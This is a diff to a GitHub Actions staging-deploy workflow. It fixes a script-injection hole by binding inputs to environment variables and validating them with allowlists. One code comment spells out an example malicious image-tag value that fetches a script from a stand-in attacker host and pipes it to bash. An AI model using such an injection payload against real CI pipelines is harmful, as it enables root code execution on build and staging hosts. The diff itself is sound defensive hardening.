@@ -92,19 +92,21 @@ jobs:
 
       - name: Resolve the staging host by tag
         id: host
+        env:
+          ENVIRONMENT_TAG: ${{ inputs.environment-tag }}
         run: |
           set -euo pipefail
           # Deliberately NOT an instance id. Whatever host currently carries the
           # staging tag is the target, including one created ten minutes ago.
           ID=$(aws ec2 describe-instances \
-                --filters "Name=tag:Environment,Values=${{ inputs.environment-tag }}" \
+                --filters "Name=tag:Environment,Values=$ENVIRONMENT_TAG" \
                           "Name=tag:Role,Values=app-host" \
                           "Name=instance-state-name,Values=running" \
                 --query 'Reservations[].Instances[].InstanceId' --output text)
 
           COUNT=$(echo "$ID" | wc -w)
           if [ "$COUNT" -eq 0 ]; then
-            echo "::error::No running host tagged Environment=${{ inputs.environment-tag }}, Role=app-host. Run the staging Terraform first."
+            echo "::error::No running host tagged Environment=$ENVIRONMENT_TAG, Role=app-host. Run the staging Terraform first."
             exit 1
           fi
           if [ "$COUNT" -gt 1 ]; then
@@ -133,11 +135,48 @@ jobs:
 
       - name: Deploy
         id: deploy
+        # Inputs are bound to env, NEVER interpolated as ${{ }} into the script.
+        #
+        # This is a security boundary, not a style preference. GitHub substitutes
+        # ${{ }} as raw TEXT before bash ever sees the line, so a caller passing
+        #     image-tag: 'x"$(curl -s http://attacker/p | bash)"'
+        # got that text spliced into the runner's shell. Worse, the value was then
+        # baked into the CMD heredoc, base64'd, and executed AS ROOT on the staging
+        # host over SSM. Any of the nine repositories trusted by this workflow could
+        # reach a host in the account that also runs production.
+        #
+        # Bound through env, "$IMAGE_TAG" expands to a value and bash does not
+        # re-evaluate what comes out, so command substitution inside the value stays
+        # inert. The validation below then rejects it outright anyway.
+        env:
+          IMAGE_TAG_IN: ${{ inputs.image-tag }}
+          APP_NAME: ${{ inputs.app-name }}
+          COMPOSE_FILES: ${{ inputs.compose-files }}
         run: |
           set -euo pipefail
-          TAG="${{ inputs.image-tag }}"
-          [ -z "$TAG" ] && TAG="${GITHUB_SHA::7}"
-          APP_DIR="/opt/seolith/staging/${{ inputs.app-name }}"
+
+          # Reject anything that is not a plain tag or path fragment BEFORE it can
+          # reach the host. Defence in depth: env binding stops execution on the
+          # runner, this stops the value being written into a script that root runs.
+          case "$IMAGE_TAG_IN" in
+            "" ) TAG="${GITHUB_SHA::7}" ;;
+            *[!A-Za-z0-9._-]* )
+              echo "::error::Refusing image-tag '$IMAGE_TAG_IN' -- only [A-Za-z0-9._-] permitted."
+              exit 1 ;;
+            * ) TAG="$IMAGE_TAG_IN" ;;
+          esac
+          case "$APP_NAME" in
+            ""|*[!A-Za-z0-9._-]* )
+              echo "::error::Refusing app-name '$APP_NAME' -- only [A-Za-z0-9._-] permitted."
+              exit 1 ;;
+          esac
+          case "$COMPOSE_FILES" in
+            ""|*[!A-Za-z0-9._/\ -]* )
+              echo "::error::Refusing compose-files '$COMPOSE_FILES' -- only [A-Za-z0-9._/-] and spaces permitted."
+              exit 1 ;;
+          esac
+
+          APP_DIR="/opt/seolith/staging/$APP_NAME"
 
           # Idempotent by construction: creates the directory if absent, pulls,
           # and brings the stack up. Assumes nothing already exists on the host.
@@ -148,7 +187,7 @@ jobs:
           # Build the -f chain. Order matters: later files override earlier
           # ones, so the base must come first.
           FLAGS=""
-          for f in ${{ inputs.compose-files }}; do
+          for f in $COMPOSE_FILES; do
             if [ ! -f "\$f" ]; then
               echo "MISSING_COMPOSE: \$f not found in $APP_DIR" >&2
               ls -1 "$APP_DIR" >&2
@@ -185,7 +224,7 @@ jobs:
           CMD_ID=$(aws ssm send-command \
             --instance-ids "${{ steps.host.outputs.instance-id }}" \
             --document-name "AWS-RunShellScript" \
-            --comment "deploy ${{ inputs.app-name }} @ $TAG" \
+            --comment "deploy $APP_NAME @ $TAG" \
             --timeout-seconds 900 \
             --parameters "file://$PARAMS" \
             --query 'Command.CommandId' --output text)
@@ -213,11 +252,22 @@ jobs:
 
       - name: Health check
         if: inputs.health-url != ''
+        # Same boundary as the deploy step. A URL is data, not shell -- interpolated
+        # directly it is a second injection site reachable by any of the nine callers.
+        env:
+          HEALTH_URL: ${{ inputs.health-url }}
+          HEALTH_TIMEOUT: ${{ inputs.health-timeout-seconds }}
+          APP_NAME: ${{ inputs.app-name }}
         run: |
           set -euo pipefail
-          DEADLINE=$(( $(date +%s) + ${{ inputs.health-timeout-seconds }} ))
+          case "$HEALTH_TIMEOUT" in ''|*[!0-9]*) echo "::error::health-timeout-seconds must be an integer."; exit 1 ;; esac
+          case "$HEALTH_URL" in
+            http://*|https://*) ;;
+            *) echo "::error::health-url must be an http(s) URL."; exit 1 ;;
+          esac
+          DEADLINE=$(( $(date +%s) + HEALTH_TIMEOUT ))
           until [ "$(date +%s)" -ge "$DEADLINE" ]; do
-            CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "${{ inputs.health-url }}" || echo 000)
+            CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$HEALTH_URL" || echo 000)
             if [ "$CODE" -ge 200 ] && [ "$CODE" -lt 400 ]; then
               echo "Healthy (HTTP $CODE)"
               exit 0
@@ -225,19 +275,22 @@ jobs:
             echo "waiting... (HTTP $CODE)"
             sleep 10
           done
-          echo "::error::${{ inputs.app-name }} did not become healthy within ${{ inputs.health-timeout-seconds }}s."
+          echo "::error::$APP_NAME did not become healthy within ${HEALTH_TIMEOUT}s."
           exit 1
 
       - name: Summary
         if: always()
+        env:
+          APP_NAME: ${{ inputs.app-name }}
+          COMPOSE_FILES: ${{ inputs.compose-files }}
         run: |
           {
-            echo "### Staging deploy — ${{ inputs.app-name }}"
+            echo "### Staging deploy — $APP_NAME"
             echo ""
             echo "| | |"
             echo "|---|---|"
             echo "| Host | \`${{ steps.host.outputs.instance-id }}\` |"
-            echo "| Compose | \`${{ inputs.compose-files }}\` |"
+            echo "| Compose | \`$COMPOSE_FILES\` |"
             echo "| SSM command | \`${{ steps.deploy.outputs.command-id }}\` |"
             echo "| Result | ${{ job.status }} |"
           } >> "$GITHUB_STEP_SUMMARY"
